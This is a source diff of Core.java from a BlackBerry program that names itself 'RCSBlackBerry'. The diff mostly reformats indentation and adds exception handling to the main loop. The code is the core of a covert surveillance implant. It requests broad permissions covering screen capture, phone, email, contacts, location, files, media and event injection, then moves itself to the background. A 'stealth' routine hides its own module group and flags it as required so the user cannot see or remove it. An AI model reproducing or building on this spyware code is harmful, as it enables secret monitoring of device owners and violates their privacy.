@@ -31,293 +31,298 @@ import blackberry.utils.Utils;
  */
 public final class Core implements Runnable {
 
-    /** The debug instance. */
-    //#ifdef DEBUG
-    private static Debug debug;
-    //#endif
-    private static Core instance;
+	/** The debug instance. */
+	//#ifdef DEBUG
+	private static Debug debug;
+	//#endif
+	private static Core instance;
 
-    /**
-     * Gets the single instance of Core.
-     * 
-     * @return single instance of Core
-     */
-    public static synchronized Core getInstance() {
-        if (instance == null) {
-            instance = new Core();
-        }
-        return instance;
-    }
+	/**
+	 * Gets the single instance of Core.
+	 * 
+	 * @return single instance of Core
+	 */
+	public static synchronized Core getInstance() {
+		if (instance == null) {
+			instance = new Core();
+		}
+		return instance;
+	}
 
-    /**
-     * Lib main.
-     * 
-     * @param args
-     *            the args
-     */
-    public static void libMain(final String[] args) {
-        final Core core = Core.getInstance();
-        core.run();
-    }
+	/**
+	 * Lib main.
+	 * 
+	 * @param args
+	 *            the args
+	 */
+	public static void libMain(final String[] args) {
+		final Core core = Core.getInstance();
+		core.run();
+	}
 
-    /** The task obj. */
-    private final Task task;
+	/** The task obj. */
+	private final Task task;
 
-    /**
-     * Instantiates a new core.
-     */
-    private Core() {
+	/**
+	 * Instantiates a new core.
+	 */
+	private Core() {
 
-        Path.makeDirs();
+		Path.makeDirs();
 
-        //#ifdef DEBUG
-        Debug.init();
-        debug = new Debug("Core", DebugLevel.VERBOSE);
-        debug.info("INIT " + (new Date()).toString());
-        //#endif
+		//#ifdef DEBUG
+		debug = new Debug("Core", DebugLevel.VERBOSE);
+		debug.info("INIT " + (new Date()).toString());
+		//#endif
 
-        checkPermissions();
+		checkPermissions();
 
-        task = Task.getInstance();
-        Utils.sleep(1000);
+		task = Task.getInstance();
+		Utils.sleep(1000);
 
-        final boolean antennaInstalled = true;
-        //#ifdef DEBUG
-        System.out.println("DEBUG");
-        //#endif
+		final boolean antennaInstalled = true;
+		//#ifdef DEBUG
+		System.out.println("DEBUG");
+		//#endif
 
-        //#ifdef DEBUG_TRACE
-        System.out.println("DEBUG_TRACE");
-        //#endif
-        //#ifdef DEBUG_INFO
-        System.out.println("DEBUG_INFO");
-        //#endif
-        //#ifdef DEBUG_WARN
-        System.out.println("DEBUG_WARN");
-        //#endif
-        //#ifdef DEBUG_ERROR
-        System.out.println("DEBUG_ERROR");
-        //#endif
-        //#ifdef DEBUG_FATAL
-        System.out.println("DEBUG_FATAL");
-        //#endif
+		//#ifdef DEBUG_TRACE
+		System.out.println("DEBUG_TRACE");
+		//#endif
+		//#ifdef DEBUG_INFO
+		System.out.println("DEBUG_INFO");
+		//#endif
+		//#ifdef DEBUG_WARN
+		System.out.println("DEBUG_WARN");
+		//#endif
+		//#ifdef DEBUG_ERROR
+		System.out.println("DEBUG_ERROR");
+		//#endif
+		//#ifdef DEBUG_FATAL
+		System.out.println("DEBUG_FATAL");
+		//#endif
 
-        Encryption.init();
+		Encryption.init();
 
-        ((Main) Application.getApplication()).goBackground();
-    }
+		((Main) Application.getApplication()).goBackground();
+	}
 
-    /**
-     * This method showcases the ability to check the current permissions for
-     * the application. If the permissions are insufficient, the user will be
-     * prompted to increase the level of permissions. You may want to restrict
-     * permissions for the ApplicationPermissionsDemo.cod module beforehand in
-     * order to demonstrate this sample effectively. This can be done in
-     * Options/Advanced Options/Applications/(menu)Modules.Highlight
-     * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
-     * Permissions' from the menu.
-     */
-    private void checkPermissions() {
+	/**
+	 * This method showcases the ability to check the current permissions for
+	 * the application. If the permissions are insufficient, the user will be
+	 * prompted to increase the level of permissions. You may want to restrict
+	 * permissions for the ApplicationPermissionsDemo.cod module beforehand in
+	 * order to demonstrate this sample effectively. This can be done in
+	 * Options/Advanced Options/Applications/(menu)Modules.Highlight
+	 * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
+	 * Permissions' from the menu.
+	 */
+	private void checkPermissions() {
 
-        //#ifdef DEBUG_TRACE
-        debug.trace("CheckPermissions");
-        //#endif
+		//#ifdef DEBUG_TRACE
+		debug.trace("CheckPermissions");
+		//#endif
 
-        // NOTE: This sample leverages the following permissions:
-        // --Event Injector
-        // --Phone
-        // --Device Settings
-        // --Email
-        // The sample demonstrates how these user defined permissions will
-        // cause the respective tests to succeed or fail. Individual
-        // applications will require access to different permissions.
-        // Please review the Javadocs for the ApplicationPermissions class
-        // for a list of all available permissions
-        // May 13, 2008: updated permissions by replacing deprecated constants.
+		// NOTE: This sample leverages the following permissions:
+		// --Event Injector
+		// --Phone
+		// --Device Settings
+		// --Email
+		// The sample demonstrates how these user defined permissions will
+		// cause the respective tests to succeed or fail. Individual
+		// applications will require access to different permissions.
+		// Please review the Javadocs for the ApplicationPermissions class
+		// for a list of all available permissions
+		// May 13, 2008: updated permissions by replacing deprecated constants.
 
-        // Capture the current state of permissions and check against the
-        // requirements
-        final ApplicationPermissionsManager apm = ApplicationPermissionsManager
-                .getInstance();
-        final ApplicationPermissions original = apm.getApplicationPermissions();
+		// Capture the current state of permissions and check against the
+		// requirements
+		final ApplicationPermissionsManager apm = ApplicationPermissionsManager
+				.getInstance();
+		final ApplicationPermissions original = apm.getApplicationPermissions();
 
-        // Set up and attach a reason provider
-        final CoreReasonProvider drp = new CoreReasonProvider();
-        apm.addReasonProvider(ApplicationDescriptor
-                .currentApplicationDescriptor(), drp);
+		// Set up and attach a reason provider
+		final CoreReasonProvider drp = new CoreReasonProvider();
+		apm.addReasonProvider(ApplicationDescriptor
+				.currentApplicationDescriptor(), drp);
 
-        final int[] wantedPermissions = new int[] {
-                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
-                ApplicationPermissions.PERMISSION_PHONE,
-                ApplicationPermissions.PERMISSION_BLUETOOTH,
-                ApplicationPermissions.PERMISSION_WIFI,
-                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
-                ApplicationPermissions.PERMISSION_PIM,
-                ApplicationPermissions.PERMISSION_PHONE,
-                ApplicationPermissions.PERMISSION_LOCATION_API,
-                ApplicationPermissions.PERMISSION_FILE_API,
-                ApplicationPermissions.PERMISSION_MEDIA,
-                ApplicationPermissions.PERMISSION_EMAIL,
-                ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
-                ApplicationPermissions.PERMISSION_IDLE_TIMER,
-                ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
-                ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
-                ApplicationPermissions.PERMISSION_BROWSER_FILTER
-                };
+		final int[] wantedPermissions = new int[] {
+				ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
+				ApplicationPermissions.PERMISSION_PHONE,
+				ApplicationPermissions.PERMISSION_BLUETOOTH,
+				ApplicationPermissions.PERMISSION_WIFI,
+				ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
+				ApplicationPermissions.PERMISSION_PIM,
+				ApplicationPermissions.PERMISSION_PHONE,
+				ApplicationPermissions.PERMISSION_LOCATION_API,
+				ApplicationPermissions.PERMISSION_FILE_API,
+				ApplicationPermissions.PERMISSION_MEDIA,
+				ApplicationPermissions.PERMISSION_EMAIL,
+				ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
+				ApplicationPermissions.PERMISSION_IDLE_TIMER,
+				ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
+				ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
+				ApplicationPermissions.PERMISSION_BROWSER_FILTER };
 
-        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
+		//TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
-        boolean allPermitted = true;
-        for (int i = 0; i < wantedPermissions.length; i++) {
-            final int perm = wantedPermissions[i];
+		boolean allPermitted = true;
+		for (int i = 0; i < wantedPermissions.length; i++) {
+			final int perm = wantedPermissions[i];
 
-            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
-                allPermitted = false;
-            }
-        }
+			if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
+				allPermitted = false;
+			}
+		}
 
-        if (allPermitted) {
-            // All of the necessary permissions are currently available
-            //#ifdef DEBUG_INFO
-            debug
-                    .info("All of the necessary permissions are currently available");
-            //#endif
-            return;
-        }
+		if (allPermitted) {
+			// All of the necessary permissions are currently available
+			//#ifdef DEBUG_INFO
+			debug
+					.info("All of the necessary permissions are currently available");
+			//#endif
+			return;
+		}
 
-        // Create a permission request for each of the permissions your
-        // application
-        // needs. Note that you do not want to list all of the possible
-        // permission
-        // values since that provides little value for the application or the
-        // user.
-        // Please only request the permissions needed for your application.
-        final ApplicationPermissions permRequest = new ApplicationPermissions();
-        for (int i = 0; i < wantedPermissions.length; i++) {
-            final int perm = wantedPermissions[i];
-            permRequest.addPermission(perm);
-        }
+		// Create a permission request for each of the permissions your
+		// application
+		// needs. Note that you do not want to list all of the possible
+		// permission
+		// values since that provides little value for the application or the
+		// user.
+		// Please only request the permissions needed for your application.
+		final ApplicationPermissions permRequest = new ApplicationPermissions();
+		for (int i = 0; i < wantedPermissions.length; i++) {
+			final int perm = wantedPermissions[i];
+			permRequest.addPermission(perm);
+		}
 
-        final boolean acceptance = ApplicationPermissionsManager.getInstance()
-                .invokePermissionsRequest(permRequest);
+		final boolean acceptance = ApplicationPermissionsManager.getInstance()
+				.invokePermissionsRequest(permRequest);
 
-        if (acceptance) {
-            // User has accepted all of the permissions
-            //#ifdef DEBUG_INFO
-            debug.info("User has accepted all of the permissions");
-            //#endif
-            return;
-        } else {
-            //#ifdef DEBUG
-            debug.warn("User has accepted some or none of the permissions");
-            //#endif
-        }
-    }
+		if (acceptance) {
+			// User has accepted all of the permissions
+			//#ifdef DEBUG_INFO
+			debug.info("User has accepted all of the permissions");
+			//#endif
+			return;
+		} else {
+			//#ifdef DEBUG
+			debug.warn("User has accepted some or none of the permissions");
+			//#endif
+		}
+	}
 
-    /**
-     * Run.
-     * 
-     * @return true, if successful
-     */
-    public void run() {
-        stealth();
+	/**
+	 * Run.
+	 * 
+	 * @return true, if successful
+	 */
+	public void run() {
+		stealth();
 
-        Utils.sleep(500);
+		Utils.sleep(500);
 
-        for (;;) {
-            //#ifdef DEBUG_INFO
-            debug.info("init task");
-            //#endif
-            if (task.taskInit() == false) {
-                //#ifdef DEBUG
-                debug.error("TaskInit() FAILED");
-                //#endif
-                break;
-            } else {
-                //#ifdef DEBUG_TRACE
-                debug.trace("TaskInit() OK");
-                //#endif
-                // CHECK: Status o init?
-            }
+		try {
+			for (;;) {
+				//#ifdef DEBUG_INFO
+				debug.info("init task");
+				//#endif
+				if (task.taskInit() == false) {
+					//#ifdef DEBUG
+					debug.error("TaskInit() FAILED");
+					//#endif
+					break;
+				} else {
+					//#ifdef DEBUG_TRACE
+					debug.trace("TaskInit() OK");
+					//#endif
+					// CHECK: Status o init?
+				}
 
-            Status.getInstance().setRestarting(false);
+				Status.getInstance().setRestarting(false);
 
-            //#ifdef DEBUG_INFO
-            debug.info("starting checking actions");
-            //#endif
-            if (task.checkActions() == false) {
-                //#ifdef DEBUG
-                debug.error("CheckActions() [Uninstalling?] FAILED");
-                //#endif
-                // chiudere tutti i thread
-                // decidere se e' un uninstall
-                break;
-            } else {
-                //#ifdef DEBUG_INFO
-                debug.info("Waiting a while before reloading");
-                //#endif
-                Utils.sleep(2000);
-            }
-        }
+				//#ifdef DEBUG_INFO
+				debug.info("starting checking actions");
+				//#endif
+				if (task.checkActions() == false) {
+					//#ifdef DEBUG
+					debug.error("CheckActions() [Uninstalling?] FAILED");
+					//#endif
+					// chiudere tutti i thread
+					// decidere se e' un uninstall
+					break;
+				} else {
+					//#ifdef DEBUG_INFO
+					debug.info("Waiting a while before reloading");
+					//#endif
+					Utils.sleep(2000);
+				}
+			}
+		} catch(Exception ex){
+			//#ifdef DEBUG_ERROR
+			debug.error(ex);
+			//#endif
+		}finally {
 
-        //#ifdef DEBUG_TRACE
-        debug.trace("RCSBlackBerry exit ");
-        //#endif
+			//#ifdef DEBUG_TRACE
+			debug.trace("RCSBlackBerry exit ");
+			//#endif
 
-        //#ifdef DEBUG
-        Debug.stop();
-        //#endif
+			//#ifdef DEBUG
+			Debug.stop();
+			//#endif
 
-        Utils.sleep(2000);
-        System.exit(0);
-    }
+			Utils.sleep(2000);
+			System.exit(0);
+		}
+	}
 
-    /**
-     * Stealth.
-     */
-    private void stealth() {
+	/**
+	 * Stealth.
+	 */
+	private void stealth() {
 
-        try {
+		try {
 
-            String sCurrentModuleName = ApplicationDescriptor
-                    .currentApplicationDescriptor().getModuleName();
-            //#ifdef DEBUG_INFO
-            debug.info(sCurrentModuleName);
-            //#endif
+			String sCurrentModuleName = ApplicationDescriptor
+					.currentApplicationDescriptor().getModuleName();
+			//#ifdef DEBUG_INFO
+			debug.info(sCurrentModuleName);
+			//#endif
 
-            CodeModuleGroup[] allGroups = CodeModuleGroupManager.loadAll();
-            CodeModuleGroup myGroup = null;
-            String moduleName = ApplicationDescriptor
-                    .currentApplicationDescriptor().getModuleName();
+			CodeModuleGroup[] allGroups = CodeModuleGroupManager.loadAll();
+			CodeModuleGroup myGroup = null;
+			String moduleName = ApplicationDescriptor
+					.currentApplicationDescriptor().getModuleName();
 
-            for (int i = 0; i < allGroups.length; i++) {
-                if (allGroups[i].containsModule(moduleName)) {
-                    myGroup = allGroups[i];
-                    break;
-                }
-            }
+			for (int i = 0; i < allGroups.length; i++) {
+				if (allGroups[i].containsModule(moduleName)) {
+					myGroup = allGroups[i];
+					break;
+				}
+			}
 
-            if (myGroup != null) {
-                myGroup.setFlag(CodeModuleGroup.FLAG_REQUIRED, true);
-                
-                //#ifdef DEBUG_TRACE
-                debug.trace("stealth: hiding...");
-                //#endif                
-                myGroup.setFlag(CodeModuleGroup.FLAG_HIDDEN, true);
-                //#ifdef DEBUG_INFO
-                debug.info("Group Hidden!");
-                //#endif
-            }else{
-                //#ifdef DEBUG_WARN
-                debug.warn("group not found");
-                //#endif
-            }
+			if (myGroup != null) {
+				myGroup.setFlag(CodeModuleGroup.FLAG_REQUIRED, true);
 
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
-            debug.error(ex);
-            //#endif
-        }
-    }
+				//#ifdef DEBUG_TRACE
+				debug.trace("stealth: hiding...");
+				//#endif                
+				myGroup.setFlag(CodeModuleGroup.FLAG_HIDDEN, true);
+				//#ifdef DEBUG_INFO
+				debug.info("Group Hidden!");
+				//#endif
+			} else {
+				//#ifdef DEBUG_WARN
+				debug.warn("group not found");
+				//#endif
+			}
+
+		} catch (Exception ex) {
+			//#ifdef DEBUG_ERROR
+			debug.error(ex);
+			//#endif
+		}
+	}
 
 }
